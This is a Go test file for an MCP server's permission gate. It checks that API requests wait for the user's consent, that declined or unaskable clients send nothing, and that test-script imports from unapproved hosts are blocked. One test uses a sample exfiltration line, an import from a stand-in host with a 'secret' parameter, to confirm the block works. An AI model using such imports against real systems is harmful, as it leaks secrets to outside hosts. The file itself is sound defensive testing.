package mcp

import (
	"bufio"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/githiago-f/lazyapi/internal/permit"
	"github.com/githiago-f/lazyapi/internal/store"
)

// guardedServer starts a server whose requests go through a policy, with a
// client that does (or does not) declare elicitation.
func guardedServer(t *testing.T, root string, elicit bool) (*client, *permit.Policy) {
	t.Helper()
	inR, inW := io.Pipe()
	outR, outW := io.Pipe()
	policy := &permit.Policy{Store: &permit.Store{Path: filepath.Join(t.TempDir(), "permissions.json")}}
	srv := &Server{Name: "lazyapi", Version: "test", Tools: &Tools{Root: root, FindSpecs: store.FindSpecFiles, Permit: policy}}
	policy.Ask = srv.Asker
	go func() {
		_ = srv.Serve(context.Background(), inR, outW)
		_ = outW.Close()
	}()
	t.Cleanup(func() { _ = inW.Close() })
	sc := bufio.NewScanner(outR)
	sc.Buffer(make([]byte, 0, 1<<20), 16<<20)
	c := &client{t: t, in: inW, out: sc}
	caps := map[string]any{}
	if elicit {
		caps["elicitation"] = map[string]any{}
	}
	c.call("initialize", map[string]any{"protocolVersion": "2025-06-18", "capabilities": caps,
		"clientInfo": map[string]any{"name": "test", "version": "1"}})
	return c, policy
}

func TestSendAsksTheUserFirst(t *testing.T) {
	hits := 0
	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits++
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"id": 1}`))
	}))
	defer api.Close()
	root := setupRoot(t, api.URL)
	c, policy := guardedServer(t, root, true)

	ask := func(answer map[string]any) (string, bool) {
		t.Helper()
		c.id++
		data, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": c.id, "method": "tools/call",
			"params": map[string]any{"name": "send_request", "arguments": map[string]any{"spec": "api/spec.yml", "operation": "getUser"}}})
		c.send(string(data))
		if !c.out.Scan() {
			t.Fatal("no message")
		}
		var msg map[string]any
		_ = json.Unmarshal(c.out.Bytes(), &msg)
		if msg["method"] != "elicitation/create" {
			t.Fatalf("expected a question before the request, got %s", c.out.Text())
		}
		question := msg["params"].(map[string]any)["message"].(string)
		reply, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": msg["id"], "result": answer})
		c.send(string(reply))
		if !c.out.Scan() {
			t.Fatal("no tool result")
		}
		var resp map[string]any
		_ = json.Unmarshal(c.out.Bytes(), &resp)
		result := resp["result"].(map[string]any)
		return question + "\n" + result["content"].([]any)[0].(map[string]any)["text"].(string), result["isError"].(bool)
	}

	// Declined: nothing reaches the server.
	text, isErr := ask(map[string]any{"action": "decline"})
	if hits != 0 || !strings.Contains(text, "did not allow") || !strings.Contains(text, "this machine") {
		t.Fatalf("declined (isError %v, hits %d):\n%s", isErr, hits, text)
	}

	// Accepted: sent, and remembered (local servers are asked once).
	if text, _ := ask(map[string]any{"action": "accept", "content": map[string]any{"allow": "always"}}); hits != 1 || !strings.Contains(text, `"outcome": "passed"`) {
		t.Fatalf("accepted (hits %d):\n%s", hits, text)
	}
	if _, _, _ = c.tool("send_request", map[string]any{"spec": "api/spec.yml", "operation": "getUser"}); hits != 2 {
		t.Fatal("asked again after a remembered answer")
	}
	if !policy.Store.Allowed(permit.Loopback, true) {
		t.Error("not remembered")
	}
}

func TestClientsThatCannotAskAreRefused(t *testing.T) {
	hits := 0
	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hits++ }))
	defer api.Close()
	c, _ := guardedServer(t, setupRoot(t, api.URL), false)
	_, text, _ := c.tool("send_request", map[string]any{"spec": "api/spec.yml", "operation": "getUser"})
	if hits != 0 || !strings.Contains(text, "lazyapi allow localhost") || !strings.Contains(text, "Do not run it yourself") {
		t.Errorf("hits %d:\n%s", hits, text)
	}
	// run_tests reports every operation blocked, sends nothing.
	_, text, _ = c.tool("run_tests", map[string]any{"spec": "api/spec.yml", "params": map[string]string{"id": "1"}})
	if hits != 0 || !strings.Contains(text, "lazyapi blocked") {
		t.Errorf("run_tests hits %d:\n%s", hits, text)
	}
}

// A test script's https:// import is a request too: it cannot reach (or
// leak data to) a host nobody allowed.
func TestScriptImportsNeedPermission(t *testing.T) {
	c, _ := guardedServer(t, setupRoot(t, "http://127.0.0.1:1"), false)
	_, text, _ := c.tool("write_test", map[string]any{"spec": "api/spec.yml", "operation": "getUser",
		"source": `import { x } from "https://cdn.example.invalid/leak.js?secret=1"; test("t", () => {});`})
	if !strings.Contains(text, "lazyapi blocked GET https://cdn.example.invalid/leak.js") {
		t.Errorf("import was not blocked:\n%s", text)
	}
}
